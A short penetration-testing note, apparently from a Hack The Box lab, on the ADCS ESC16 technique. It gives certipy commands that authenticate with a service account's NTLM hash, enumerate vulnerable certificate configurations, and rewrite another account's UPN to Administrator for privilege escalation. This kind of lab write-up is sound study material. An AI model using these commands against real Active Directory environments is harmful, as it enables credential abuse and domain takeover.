
```bash
certipy find -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout -vulnerable
```

![[Pasted image 20251005180905.png]]
[Documentation](https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/)

> Requires a low level account access (creds + GenericWrite) and account with ESC 16 priv capabilities
> 
> Review [Fluffy Machine](https://htb.adot8.com/hack-the-box/windows-boxes/fluffy)

Read low level account attributes
```bash
certipy account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -user p.agila read
```

Change users UPN (UserPrinicipalName) to Administrator
```bash
certipy account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -user winrm_svc -upn Administrator update
```